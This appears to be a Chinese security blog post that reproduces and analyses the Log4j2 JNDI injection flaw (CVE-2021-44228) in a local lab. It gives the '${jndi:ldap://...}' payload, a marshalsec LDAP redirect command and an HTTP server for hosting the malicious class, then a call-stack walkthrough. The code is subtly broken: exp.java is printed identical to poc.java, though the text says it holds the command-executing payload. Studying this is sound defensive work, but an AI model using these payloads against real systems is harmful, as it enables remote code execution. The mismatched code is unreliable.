---
title: Apache Log4j2 漏洞复现和分析
date: '2022/1/22 20:29:01'
categories:
  - - 漏洞复现
description: Apache Log4j2 (cve-2021-44228) 漏洞复现和分析
tags:
---

# Apache log4j2 (CVE-2021-44228)漏洞复现与分析

## 漏洞介绍

### Apache Log4j2 简述
Apache Log4j2 是一款优秀的Java日志框架，该工具重写了Log4j框架，并且引入了大量新的特性。

### 漏洞简述
由于Apache Log4j2某些功能存在递归解析功能，攻击者可直接构造恶意请求，触发远程代码执行漏洞。而且因为该组件广泛应用在Java程序中，影响范围极大。

### 漏洞影响
本次漏洞影响的产品版本包括：Apache Log4j2 2.0 - 2.15.0-rc1，利用该漏洞，攻击者能够在未授权的情况下远程执行代码。


## 漏洞复现流程

### 环境配置

适用jdk版本：JDK 11.0.1、8u191、7u201、6u211之前

[jdk环境下载](https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html)

> 这里使用的是jdk-8u144环境进行演示

### 创建一个maven项目，并导入log4j的依赖包

> 创建maven项目时候，选择SDK为jdk-8u144

#### 修改Pom.xml文件
```Pom.xml```中代码如下
```xml
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>
    <groupId>org.example</groupId>
    <artifactId>log4j</artifactId>
    <version>1.0-SNAPSHOT</version>
    <dependencies>
        <!-- https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-core -->
        <dependency>
            <groupId>org.apache.logging.log4j</groupId>
            <artifactId>log4j-core</artifactId>
            <version>2.14.1</version>
        </dependency>
        <!-- https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-api -->
        <dependency>
            <groupId>org.apache.logging.log4j</groupId>
            <artifactId>log4j-api</artifactId>
            <version>2.14.1</version>
        </dependency>
    </dependencies>
    <properties>
        <maven.compiler.source>8</maven.compiler.source>
        <maven.compiler.target>8</maven.compiler.target>
    </properties>
</project>
 ```

#### 新建exp.java文件
```exp.java```的代码如下
```java
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
class LogTest {
    public static final Logger logger = LogManager.getLogger();
    public static void main(String[] args) {
        logger.error("${jndi:ldap://localhost:8888/Exploit}");
    }
}
 ```

#### 新建poc.java文件
```poc.java```的代码如下
```java
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
class LogTest {
    public static final Logger logger = LogManager.getLogger();
    public static void main(String[] args) {
        logger.error("${jndi:ldap://localhost:8888/Exploit}");
    }
}
 ```

#### 编译exp.java
在```.\src\test\java\```目录下进行编译，得到exp.class
```shell
cd .\src\test\java\
javac exp.java
```

#### 借助反序列化利用工具marshalsec
接下来需要用到java的反序列化利用工具marshalsec，直接从github上面clone下来，利用命令行cmd
```shell
git clone https://github.com/mbechler/marshalsec.git
cd marshalsec
mvn clean package -DskipTests
```
然后进入target目录，可以看到marshalsec-0.0.3-SNAPSHOT-all.jar这个工具，利用命令行cmd
```shell
java -cp .\marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://127.0.0.1:8000/#Exploit" 8888
```

#### 启动HTTP Server
然后在Exlpoit.class文件的目录下启动命令行cmd，利用Python启动一个HTTP Server
```shell
python -m http.server 8000
```

#### 运行poc.java
结果如下，可以看到成功的执行了弹出计算器的语句
![img](https://testingcf.jsdelivr.net/gh/black-and-while/website_save_images/vulnerability_recurrence/java_log4j2/result.png)

#### 整个项目的目录情况
![img](https://testingcf.jsdelivr.net/gh/black-and-while/website_save_images/vulnerability_recurrence/java_log4j2/file_directory.png)


## 原理分析

### JNDI注入

#### 原理

将恶意的Reference类绑定在RMI注册表中，其中恶意引用指向远程恶意的class文件，当用户在JNDI客户端的lookup()函数参数外部可控或Reference类构造方法的classFactoryLocation参数外部可控时，会使用户的JNDI客户端访问RMI注册表中绑定的恶意Reference类，从而加载远程服务器上的恶意class文件在客户端本地执行，最终实现JNDI注入攻击导致远程代码执行

#### 利用条件

（1）客户端的lookup()方法的参数可控
（2）服务端在使用Reference时，classFactoryLocation参数可控
> 二者满足一个即可

### 漏洞利用流程分析

因为最后执行命令在```exp.java```的```Runtime.getRuntime().exec(cmds);```中，因此在这里下一个断点

![img](https://testingcf.jsdelivr.net/gh/black-and-while/website_save_images/vulnerability_recurrence/java_log4j2/principle1.png)

调试后得到函数调用栈
```java
<clinit>:6, Exploit
forName0:-1, Class (java.lang)
forName:348, Class (java.lang)
loadClass:72, VersionHelper12 (com.sun.naming.internal)
loadClass:61, VersionHelper12 (com.sun.naming.internal)
getObjectFactoryFromReference:146, NamingManager (javax.naming.spi)
getObjectInstance:189, DirectoryManager (javax.naming.spi)
c_lookup:1085, LdapCtx (com.sun.jndi.ldap)
p_lookup:542, ComponentContext (com.sun.jndi.toolkit.ctx)
lookup:177, PartialCompositeContext (com.sun.jndi.toolkit.ctx)
lookup:205, GenericURLContext (com.sun.jndi.toolkit.url)
lookup:94, ldapURLContext (com.sun.jndi.url.ldap)
lookup:417, InitialContext (javax.naming)
lookup:172, JndiManager (org.apache.logging.log4j.core.net)
lookup:56, JndiLookup (org.apache.logging.log4j.core.lookup)
lookup:221, Interpolator (org.apache.logging.log4j.core.lookup)
resolveVariable:1110, StrSubstitutor (org.apache.logging.log4j.core.lookup)
substitute:1033, StrSubstitutor (org.apache.logging.log4j.core.lookup)
substitute:912, StrSubstitutor (org.apache.logging.log4j.core.lookup)
replace:467, StrSubstitutor (org.apache.logging.log4j.core.lookup)
format:132, MessagePatternConverter (org.apache.logging.log4j.core.pattern)
format:38, PatternFormatter (org.apache.logging.log4j.core.pattern)
toSerializable:344, PatternLayout$PatternSerializer (org.apache.logging.log4j.core.layout)
toText:244, PatternLayout (org.apache.logging.log4j.core.layout)
encode:229, PatternLayout (org.apache.logging.log4j.core.layout)
encode:59, PatternLayout (org.apache.logging.log4j.core.layout)
directEncodeEvent:197, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender)
tryAppend:190, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender)
append:181, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender)
tryCallAppender:156, AppenderControl (org.apache.logging.log4j.core.config)
callAppender0:129, AppenderControl (org.apache.logging.log4j.core.config)
callAppenderPreventRecursion:120, AppenderControl (org.apache.logging.log4j.core.config)
callAppender:84, AppenderControl (org.apache.logging.log4j.core.config)
callAppenders:540, LoggerConfig (org.apache.logging.log4j.core.config)
processLogEvent:498, LoggerConfig (org.apache.logging.log4j.core.config)
log:481, LoggerConfig (org.apache.logging.log4j.core.config)
log:456, LoggerConfig (org.apache.logging.log4j.core.config)
log:63, DefaultReliabilityStrategy (org.apache.logging.log4j.core.config)
log:161, Logger (org.apache.logging.log4j.core)
tryLogMessage:2205, AbstractLogger (org.apache.logging.log4j.spi)
logMessageTrackRecursion:2159, AbstractLogger (org.apache.logging.log4j.spi)
logMessageSafely:2142, AbstractLogger (org.apache.logging.log4j.spi)
logMessage:2017, AbstractLogger (org.apache.logging.log4j.spi)
logIfEnabled:1983, AbstractLogger (org.apache.logging.log4j.spi)
error:740, AbstractLogger (org.apache.logging.log4j.spi)
main:6, LogTest
```

依次跟踪发现，是一个典型的JNDI注入

![img](https://testingcf.jsdelivr.net/gh/black-and-while/website_save_images/vulnerability_recurrence/java_log4j2/principle2.png)

### 漏洞利用总结

（1）在```poc.java```中，运行到```logger.error("${jndi:ldap://localhost:8888/Exploit}");```时候，log4j发现了```${}```，对里面的信息要进行单独处理
（2）进一步解析后发现是JNDI扩展，然后再进一步解析发现是LDAP协议，然后去请求```localhost:8888/Exploit```的数据，但是请求的可能是恶意的数据
（3）如果恶意引用指向远程恶意的class文件：攻击者通过控制```lookup()```函数的参数，使用户加载远程服务器上的恶意class文件在客户端本地执行
（4）最终实现JNDI注入攻击导致远程代码执行